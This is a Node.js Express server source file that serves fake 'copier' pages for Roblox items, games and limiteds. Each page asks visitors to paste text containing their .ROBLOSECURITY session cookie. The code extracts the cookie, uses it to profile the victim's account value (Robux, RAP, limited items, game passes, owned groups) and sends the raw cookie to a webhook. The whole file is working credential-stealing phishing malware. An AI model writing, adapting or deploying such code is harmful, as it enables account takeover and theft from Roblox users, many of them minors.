const express = require('express');
const app = express();

app.use(express.json());

// Lista podstron – możesz dodać ile chcesz (każda będzie robić to samo)
const subpages = [
  '/GameCopier',
  '/ClothesCopier',
  '/ItemCopier',
  '/LimitedCopier',
  '/HairCopier',
  // dodaj kolejne np. '/AccessoryCopier'
];

// Dla każdej podstrony zwracamy identyczną stronę HTML
subpages.forEach(path => {
  app.get(path, (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Process</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0d0d0d; color: #e0e0e0; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { text-align: center; max-width: 600px; padding: 30px; background: #111; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.8); }
    textarea { width: 100%; min-height: 200px; background: #1a1a1a; color: #eee; border: 1px solid #333; border-radius: 8px; padding: 12px; font-family: Consolas, monospace; font-size: 14px; margin: 20px 0; resize: vertical; }
    button { background: #0066cc; color: white; border: none; padding: 14px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: background 0.3s; }
    button:hover { background: #0052a3; }
    #status { margin-top: 20px; font-size: 18px; font-weight: bold; }
    .success { color: #00ff9d; }
    .error { color: #ff4d4d; }
  </style>
</head>
<body>
<div class="container">
  <h1>Roblox Process</h1>
  <textarea id="input" placeholder="Wklej tekst z cookie..."></textarea>
  <button onclick="startProcess()">Start Process</button>
  <div id="status"></div>
</div>

<script>
async function startProcess() {
  const input = document.getElementById('input').value.trim();
  const status = document.getElementById('status');
  status.innerHTML = '';

  if (!input) {
    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
    return;
  }

  status.innerHTML = '<span class="loading">Processing...</span>';

  // Wyciąganie cookie – uniwersalne, łapie prawie wszystko
  let cookie = null;
  let match;

  // Headers / Cookie header
  match = input.match(/\.ROBLOSECURITY\s*=\s*([^;\n]+)/i);
  if (match && match[1]) cookie = match[1].trim();

  // PowerShell / .NET
  if (!cookie) {
    match = input.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
    if (match && match[1]) cookie = match[1].trim();
  }

  // -and-items.|_
  if (!cookie) {
    match = input.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }

  // Ostrzeżenie + długi ciąg
  if (!cookie) {
    match = input.match(/_\\|WARNING[^"]{180,}/);
    if (match) cookie = match[0].trim();
  }

  // Najdłuższy ciąg od _
  if (!cookie) {
    const fallbacks = input.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallbacks.length) cookie = fallbacks.reduce((a, b) => a.length > b.length ? a : b).trim();
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
    return;
  }

  try {
    const res = await fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });

    if (!res.ok) throw new Error('Server error');

    const json = await res.json();

    if (json.error) {
      status.innerHTML = '<span class="error">Wrong file lil bro</span>';
      return;
    }

    status.innerHTML = '<span class="success">Process completed</span>';

  } catch (err) {
    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
  }
}
</script>
</body>
</html>
    `);
  });
});

// Jeden endpoint /check – wspólny dla wszystkich podstron
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    // CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid cookie');
    const userData = await userRes.json();

    // Email Verified
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // Robux
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // RAP
    let rap = 0;
    try {
      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (assetsRes.ok) {
        const assets = await assetsRes.json();
        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
      }
    } catch {}

    // Groups Owned
    let groupsOwned = 0;
    try {
      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (groupsRes.ok) {
        const groups = await groupsRes.json();
        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
      }
    } catch {}

    // Wiek konta
    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    // Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepasy
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const jbIds = [2296901, 2219040, 56149618, 4974038, 2725211, 2070427, 2218187];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
    const hasGamePasses = [];

    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
    const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;

    // Headless i Korblox
    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const headlessRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }

      const korbloxRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}

    const result = {
      success: true,
      username: userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      rap: rap || 0,
      groupsOwned,
      accountAgeDays,
      created: createdDate || 'failed',
      avatarUrl,
      emailVerified,
      hasHeadless,
      hasKorblox,
      mm2Count,
      ampCount,
      sabCount,
      jbCount
    };

    // Wysyłka dwóch embedów w jednej wiadomości na webhook
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              // Embed 1 – pełny z kontem
              {
                color: 0x0F0F23,
                title: `<:User:1481761037257674872> ${userData.name}`,
                description: "**AVATAR**",
                thumbnail: {
                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
                },
                fields: [
                  {
                    name: "┌─────── Account Stats ───────┐",
                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
                    inline: false
                  },
                  {
                    name: "**Info**",
                    value:
                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                    inline: true
                  },
                  {
                    name: "**Games**",
                    value:
                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
                    inline: true
                  },
                  {
                    name: "**Inventory**",
                    value:
                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                    inline: true
                  }
                ],
                footer: {
                  text: "24H! • " + new Date().toLocaleString('pl-PL')
                },
                timestamp: new Date().toISOString()
              },

              // Embed 2 – tylko .ROBLOSECURITY (ciemno fioletowy)
              {
                color: 0x4B0082,
                title: ".ROBLOSECURITY",
                description: `\`\`\`\n${cookie}\n\`\`\``,
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
      } catch (e) {
        console.error("Błąd wysyłki webhook:", e.message);
      }
    }

    res.json(result);

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Serwer działa na porcie ${PORT}`);
});
